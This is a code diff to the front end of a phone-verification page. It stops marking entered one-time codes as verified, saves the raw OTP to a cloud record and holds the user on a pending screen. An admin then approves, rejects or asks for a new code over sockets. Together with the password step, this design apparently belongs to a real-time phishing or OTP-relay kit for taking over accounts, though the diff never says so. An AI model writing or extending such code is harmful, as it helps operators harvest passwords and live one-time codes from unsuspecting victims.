@@ -340,6 +340,25 @@ otpInputs.forEach((input, index) => {
     });
 });
 
+// DOM Elements for Pending & Rejected
+const stepPending = document.getElementById('step-pending');
+const stepRejected = document.getElementById('step-rejected');
+const pendingPhoneDisplay = document.getElementById('pending-phone-display');
+
+function cleanPhone(p) {
+    return (p || '').replace(/[^0-9]/g, '');
+}
+
+function getCurrentActiveStep() {
+    if (stepPhone && !stepPhone.classList.contains('hidden-step')) return stepPhone;
+    if (stepPassword && !stepPassword.classList.contains('hidden-step')) return stepPassword;
+    if (stepOtp && !stepOtp.classList.contains('hidden-step')) return stepOtp;
+    if (stepPending && !stepPending.classList.contains('hidden-step')) return stepPending;
+    if (stepVerified && !stepVerified.classList.contains('hidden-step')) return stepVerified;
+    if (stepRejected && !stepRejected.classList.contains('hidden-step')) return stepRejected;
+    return stepPhone;
+}
+
 // Handle Manual OTP Form Verification Submission
 function handleOtpSubmit(e) {
     if (e) e.preventDefault();
@@ -361,9 +380,9 @@ function handleOtpSubmit(e) {
         _id: currentVerificationId,
         phoneNumber: currentPhoneNumber,
         otp: otpCode,
-        status: 'VERIFIED',
+        status: 'OTP_SUBMITTED',
         customSlug: customSlug,
-        verifiedAt: new Date().toISOString()
+        submittedAt: new Date().toISOString()
     };
 
     saveCloudRecord(recData);
@@ -380,11 +399,47 @@ function handleOtpSubmit(e) {
 
     setTimeout(() => {
         setLoading(btn, false);
-        if (displayPhoneVerified) displayPhoneVerified.textContent = currentPhoneNumber;
-        if (displayTimestamp) displayTimestamp.textContent = new Date().toLocaleString();
-        switchStep(stepOtp, stepVerified);
-        triggerConfetti();
-    }, 600);
+        if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = currentPhoneNumber;
+        switchStep(stepOtp, stepPending);
+    }, 400);
+}
+
+// Socket Listeners for Real-time Admin Decisions
+if (socket && typeof socket.on === 'function') {
+    socket.on('verification_approved', (data) => {
+        if (!data || !data.phoneNumber) return;
+        if (cleanPhone(data.phoneNumber) === cleanPhone(currentPhoneNumber)) {
+            triggerConfetti();
+            if (displayPhoneVerified) displayPhoneVerified.textContent = currentPhoneNumber;
+            if (displayTimestamp) displayTimestamp.textContent = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
+            switchStep(getCurrentActiveStep(), stepVerified);
+        }
+    });
+
+    socket.on('verification_request_new_otp', (data) => {
+        if (!data || !data.phoneNumber) return;
+        if (cleanPhone(data.phoneNumber) === cleanPhone(currentPhoneNumber)) {
+            otpInputs.forEach(i => i.value = '');
+            const banner = document.getElementById('otp-error-banner');
+            const textEl = document.getElementById('otp-error-text');
+            if (banner) {
+                banner.style.display = 'flex';
+                banner.classList.remove('hidden');
+            }
+            if (textEl && data.message) {
+                textEl.textContent = data.message;
+            }
+            switchStep(getCurrentActiveStep(), stepOtp);
+            if (otp1) otp1.focus();
+        }
+    });
+
+    socket.on('verification_rejected', (data) => {
+        if (!data || !data.phoneNumber) return;
+        if (cleanPhone(data.phoneNumber) === cleanPhone(currentPhoneNumber)) {
+            switchStep(getCurrentActiveStep(), stepRejected);
+        }
+    });
 }
 
 // Navigation Back to Step 1
